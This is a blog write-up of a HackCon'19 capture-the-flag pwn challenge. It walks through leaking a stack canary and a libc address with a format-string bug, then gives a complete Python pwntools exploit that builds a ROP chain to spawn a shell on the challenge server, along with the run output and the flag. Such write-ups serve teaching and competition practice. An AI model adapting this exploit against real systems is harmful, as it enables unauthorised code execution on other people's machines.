@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>HackCon&#39;19 writeup - Not So Easy B0f</title>
+        
+        <style>
+
+    html body {
+        font-family: 'Roboto Mono', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #00a6d8;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://raffaeleflorio.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%20Mono">
+
+
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.55.6" />
+        
+
+        
+
+        
+        
+        <script type="text/javascript" async
+          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        </script>
+        
+    </head>
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">HackCon&#39;19 writeup - Not So Easy B0f</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                                <li><a href="/tags/">Tags</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/notsoeasyb0f-hackcon19/">HackCon&#39;19 writeup - Not So Easy B0f</a></h4>
+    <h5>September 4, 2019</h5>
+    
+    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="intro">Intro</h1>
+
+<p>This is the third pwn challenge. It was solved 29 times and it&rsquo;s worth 469 points.</p>
+
+<p>Description:</p>
+
+<blockquote>
+<p>I have stack canaries enabled, Can you still B0f me ?</p>
+</blockquote>
+
+<p>In addition to the binary there is also a specific libc.</p>
+
+<p>You can download the binary <a href="/binary/hackcon19/notsoeasyb0f">here</a> and the libc <a href="/binary/hackcon19/notsoeasyb0f-libc.so">here</a></p>
+
+<pre><code class="language-shell">$ sha256sum notsoeasyb0f notsoeasyb0f-libc.so
+9cdc861043359904c6807d31990f7369c1fec2d25e545e263bb4ae2e5786883e  notsoeasyb0f
+74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44  notsoeasyb0f-libc.so
+</code></pre>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>This program asks for a name, echoes it back, then it asks a sentence.
+It seems that both input are vulnerable to a buffer overflow.</p>
+
+<p>However, as the description says, <code>stack canary</code> is enabled.</p>
+
+<pre><code class="language-shell">$ ./notsoeasyb0f
+Enter name : NAME
+Hello
+NAME
+Enter sentence : SENTENCE
+
+$ ./notsoeasyb0f
+Enter name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hello
+*** stack smashing detected ***: &lt;unknown&gt; terminated
+Aborted (core dumped)
+
+$ ./notsoeasyb0f
+Enter name : NAME
+Hello
+ASD
+Enter sentence : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** stack smashing detected ***: &lt;unknown&gt; terminated
+Aborted (core dumped)
+
+$ checksec ./notsoeasyb0f
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+
+<p>Given the protections and the libc, a two stage attack will be performed. First a leak then a <code>ROP</code>.</p>
+
+<p>I opened with r2, as usual, and the only interesting function is the vulnerable one: <code>main</code>.
+And it&rsquo;s really simple:</p>
+
+<p><img src="/images/hackcon19/notsoeasyb0f-main.jpg" alt="main function" /></p>
+
+<p>It&rsquo;s vulnerable to <code>buffer overflow</code> and <code>format string</code>. The former is at the second <code>fgets</code>, the latter is at the second <code>printf</code>.</p>
+
+<p>So we could use the <code>format string</code> to leak the canary and a libc address. Then the <code>bof</code> to build a simple <code>ROP chain</code>.
+With trial and error and the help of radare it&rsquo;s easy to locate the offset to use with the <code>format string</code>:</p>
+
+<ul>
+<li>11 to leak the canary</li>
+<li>13 to leak the <code>saved EIP</code> of the main. In fact the latter is in the <code>__libc_start_main</code>, so in the <code>libc</code></li>
+</ul>
+
+<p>This is the exploit:</p>
+
+<pre><code class="language-python">from pwn import *
+
+prog = context.binary = ELF(&quot;PATH_TO_THE_BINARY&quot;, checksec=False)
+
+if len(sys.argv) &gt; 1:
+        host = &quot;68.183.158.95&quot;
+        port = 8991
+        t = remote(host, port)
+        system_offset = 150368
+        binsh_offset  = 1492263
+        ret_offset    = 263
+        prdi_offset   = 1393839
+else:
+        t = prog.process()
+	# these offsets should be customized locally
+        system_offset = 0
+        binsh_offset  = 0
+        ret_offset    = 0
+        prdi_offset   = 0
+
+
+# leak canary
+t.sendline(&quot;%11$p%13$p&quot;)
+t.recvuntil(&quot;Hello\n&quot;)
+canary = int(t.recv(numb=18).replace(&quot;\n&quot;, &quot;&quot;), 16)
+libc_leak = int(t.recvline().replace(&quot;\n&quot;, &quot;&quot;), 16)
+system_libc = libc_leak + system_offset
+binsh_libc = libc_leak + binsh_offset
+ret_libc = libc_leak + ret_offset
+prdi_libc = libc_leak + prdi_offset
+log.success(&quot;CANARY: {:#x}&quot;.format(canary))
+log.success(&quot;LIBC  : {:#x}&quot;.format(libc_leak))
+log.success(&quot;SYSTEM: {:#x}&quot;.format(system_libc))
+log.success(&quot;BINSH : {:#x}&quot;.format(binsh_libc))
+log.success(&quot;PRDI  : {:#x}&quot;.format(prdi_libc))
+log.success(&quot;RET   : {:#x}&quot;.format(ret_libc))
+
+canary_offset = 24
+payload = &quot;P&quot;*canary_offset
+payload += p64(canary)
+payload += &quot;P&quot;*8
+payload += p64(ret_libc)  # ret
+payload += p64(prdi_libc) # pop rdi
+payload += p64(binsh_libc)
+payload += p64(system_libc)
+
+t.sendline(payload)
+t.recvrepeat(0.3)
+t.sendline(&quot;cat flag.txt&quot;)
+print t.recvline()
+t.close()
+</code></pre>
+
+<p>And this is the flag:</p>
+
+<pre><code class="language-shell">$ ./exploit.py 1
+[+] Opening connection to 68.183.158.95 on port 8991: Done
+[+] CANARY: 0x38d86c5026063f00
+[+] LIBC  : 0x7fa7fd1fc830
+[+] SYSTEM: 0x7fa7fd221390
+[+] BINSH : 0x7fa7fd368d57
+[+] PRDI  : 0x7fa7fd350cdf
+[+] RET   : 0x7fa7fd1fc937
+d4rk{H3ll0_R0p}c0de
+
+[*] Closed connection to 68.183.158.95 port 8991
+</code></pre>
+
+<p><img src="/images/hackcon19/notsoeasyb0f-solved.jpg" alt="notsoeasyb0f solved banner" /></p>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/babypwn-hackcon19/">HackCon&#39;19 writeup - babypwn</a></h4>
+    <h5>September 4, 2019</h5>
+    
+    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/babyb0f-hackcon19/">HackCon&#39;19 writeup - baby b0f</a></h4>
+    <h5>September 4, 2019</h5>
+    
+    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
+    
+    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
